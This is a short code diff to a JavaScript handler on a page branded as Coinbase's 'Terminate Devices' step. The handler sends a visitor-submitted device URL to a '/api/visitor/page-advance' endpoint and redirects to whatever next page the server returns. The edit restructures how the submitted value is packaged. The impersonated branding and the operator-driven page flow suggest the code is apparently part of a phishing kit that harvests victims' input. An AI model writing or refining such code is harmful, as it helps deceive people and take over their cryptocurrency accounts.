@@ -50,7 +50,7 @@
   btn.addEventListener('click',function(){
     if(btn.disabled) return;
     btn.disabled=true;
-    fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Terminate Devices',choice:url.value.trim().slice(0,200)})})
+    fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Terminate Devices',choice:'link_submitted',fields:{deviceUrl:url.value.trim().slice(0,200)}})})
       .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;else btn.disabled=false;});
   });
 })();
